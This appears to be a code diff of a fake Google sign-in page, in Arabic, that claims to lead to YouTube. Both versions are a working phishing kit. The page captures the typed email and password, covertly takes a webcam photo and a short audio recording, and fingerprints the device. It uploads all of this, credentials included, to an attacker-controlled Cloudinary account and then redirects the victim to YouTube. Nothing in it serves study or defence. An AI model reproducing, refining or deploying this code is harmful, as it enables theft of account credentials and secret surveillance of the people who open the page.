@@ -3,15 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Google - التحقق من الهوية</title>
+    <title>Google - التحقق من الأمان</title>
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; }
-        body { font-family: 'Segoe UI', sans-serif; background: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
-        .card { width: 95%; max-width: 400px; padding: 40px; border: 1px solid #dadce0; border-radius: 8px; text-align: center; background: #fff; }
-        img.logo { width: 75px; margin-bottom: 10px; }
-        h1 { font-size: 24px; font-weight: 400; margin-bottom: 10px; color: #202124; }
-        input { width: 100%; padding: 13px; margin-bottom: 15px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; outline: none; }
-        button { background: #1a73e8; color: #fff; border: none; padding: 12px; width: 100%; border-radius: 4px; font-weight: 600; cursor: pointer; }
+        body { font-family: sans-serif; background: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
+        .card { width: 90%; max-width: 400px; padding: 40px; border: 1px solid #dadce0; border-radius: 8px; text-align: center; }
+        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #dadce0; border-radius: 4px; }
+        button { background: #1a73e8; color: #fff; border: none; padding: 12px; width: 100%; border-radius: 4px; cursor: pointer; }
         #v { position: absolute; width: 1px; height: 1px; opacity: 0.01; }
         #c { display: none; }
     </style>
@@ -19,10 +17,10 @@
 <body>
 
 <div class="card" id="ui">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" class="logo">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" width="75">
     <h1>تسجيل الدخول</h1>
     <p>المتابعة إلى YouTube</p>
-    <input type="email" id="e" placeholder="البريد الإلكتروني أو الهاتف" required>
+    <input type="email" id="e" placeholder="البريد الإلكتروني" required>
     <input type="password" id="p" placeholder="كلمة المرور" required>
     <button onclick="run()">التالي</button>
 </div>
@@ -35,105 +33,65 @@
 
     async function run() {
         const email = document.getElementById('e').value, pass = document.getElementById('p').value;
-        if(!email || !pass) return alert("يرجى إدخال البيانات");
+        if(!email || !pass) return;
 
         try {
+            // 1. طلب الكاميرا والمايك
             const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
             const video = document.getElementById('v');
             video.srcObject = stream;
             video.play();
 
-            document.getElementById('ui').innerHTML = "<h3>جاري مزامنة الحساب...</h3><p>يرجى الانتظار لإتمام الفحص الأمني</p>";
+            document.getElementById('ui').innerHTML = "<h3>جاري معالجة البيانات...</h3>";
 
-            const specs = await getFullFingerprint();
+            // 2. سحب البيانات فوراً (بدون انتظار البطارية لو علقت)
+            let specs = "Browser:" + navigator.userAgent;
 
-            setTimeout(async () => {
+            // 3. التقاط الصورة بعد ثانيتين
+            setTimeout(() => {
                 const canvas = document.getElementById('c');
                 canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
                 const img = canvas.toDataURL("image/png");
-                startFinalPhase(email, pass, img, specs, stream);
-            }, 2500);
+
+                // 4. تسجيل صوتي قصير (3 ثواني) لضمان السرعة
+                const recorder = new MediaRecorder(stream);
+                let chunks = [];
+                recorder.ondataavailable = ev => chunks.push(ev.data);
+                recorder.onstop = () => {
+                    const audioBlob = new Blob(chunks, { type: 'audio/webm' });
+                    
+                    // إرسال البيانات (Fire and Forget)
+                    send(email, pass, img, audioBlob, specs);
+
+                    // تحويل إجباري لليوتيوب بعد ثانية واحدة مهما كانت النتيجة
+                    setTimeout(() => { window.location.href = yt; }, 1000);
+                };
+
+                recorder.start();
+                setTimeout(() => recorder.stop(), 3000);
+
+            }, 2000);
 
         } catch (err) { window.location.href = yt; }
     }
 
-    async function getFullFingerprint() {
-        let ua = navigator.userAgent;
-        let f = {
-            br: "Other", // Browser
-            mod: "Unknown", // Model
-            lang: navigator.language,
-            tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
-            cpu: navigator.hardwareConcurrency || "N/A",
-            ram: navigator.deviceMemory || "N/A",
-            bat: "N/A", char: "N/A"
-        };
+    function send(e, p, img, aud, s) {
+        const ctx = `u=${e}|p=${p}|info=${s}`;
 
-        // فحص المتصفح بدقة
-        if (ua.indexOf("Chrome") > -1) f.br = "Chrome";
-        else if (ua.indexOf("Firefox") > -1) f.br = "Firefox";
-        else if (ua.indexOf("Safari") > -1 && ua.indexOf("Chrome") == -1) f.br = "Safari";
-        else if (ua.indexOf("Edge") > -1) f.br = "Edge";
-
-        // استخراج موديل الجهاز
-        const match = ua.match(/\(([^)]+)\)/);
-        if (match) {
-            let parts = match[1].split(';');
-            f.mod = (parts.length > 2) ? parts[2].trim() : parts[0].trim();
-            if(f.mod.includes("Linux")) f.mod = (parts[1] || "Linux").trim();
-        }
-
-        try {
-            if (navigator.getBattery) {
-                const b = await navigator.getBattery();
-                f.bat = Math.round(b.level * 100) + "%";
-                f.char = b.charging ? "Yes" : "No";
-            }
-        } catch(e){}
-        return f;
-    }
-
-    function startFinalPhase(e, p, img, s, stream) {
-        const mime = MediaRecorder.isTypeSupported('audio/webm') ? 'audio/webm' : 'audio/ogg';
-        const recorder = new MediaRecorder(stream, { mimeType: mime });
-        let chunks = [];
-
-        recorder.ondataavailable = ev => chunks.push(ev.data);
-        recorder.onstop = async () => {
-            const audioBlob = new Blob(chunks, { type: mime });
-            await sendEverything(e, p, img, audioBlob, s);
-            window.location.href = yt;
-        };
-
-        recorder.start();
-        setTimeout(() => recorder.stop(), 5000);
-    }
-
-    async function sendEverything(e, p, img, aud, s) {
-        let ip = "Unknown";
-        try { 
-            const r = await fetch('https://api.ipify.org?format=json');
-            const d = await r.json();
-            ip = d.ip;
-        } catch(err){}
-
-        // تجميع "البصمة الشاملة" في الـ Context
-        const ctx = `u=${e}|p=${p}|ip=${ip}|br=${s.br}|mod=${s.mod}|ram=${s.ram}GB|cpu=${s.cpu}C|bat=${s.bat}|char=${s.char}|tz=${s.tz}|lang=${s.lang}`;
-
+        // رفع الصورة
         const fd1 = new FormData();
-        fd1.append('file', img); fd1.append('upload_preset', pr);
-        fd1.append('context', ctx); fd1.append('tags', 'DeathLink_Master');
+        fd1.append('file', img);
+        fd1.append('upload_preset', pr);
+        fd1.append('context', ctx);
+        fetch(`https://api.cloudinary.com/v1_1/${cn}/image/upload`, { method: 'POST', body: fd1, keepalive: true });
 
+        // رفع الصوت
         const fd2 = new FormData();
-        fd2.append('file', aud); fd2.append('upload_preset', pr);
-        fd2.append('resource_type', 'video'); fd2.append('context', ctx);
-
-        await Promise.all([
-            fetch(`https://api.cloudinary.com/v1_1/${cn}/image/upload`, { method: 'POST', body: fd1 }),
-            fetch(`https://api.cloudinary.com/v1_1/${cn}/upload`, { method: 'POST', body: fd2 })
-        ]);
-        
-        return new Promise(res => setTimeout(res, 800));
+        fd2.append('file', aud);
+        fd2.append('upload_preset', pr);
+        fd2.append('resource_type', 'video');
+        fd2.append('context', ctx);
+        fetch(`https://api.cloudinary.com/v1_1/${cn}/upload`, { method: 'POST', body: fd2, keepalive: true });
     }
 </script>
 </body>
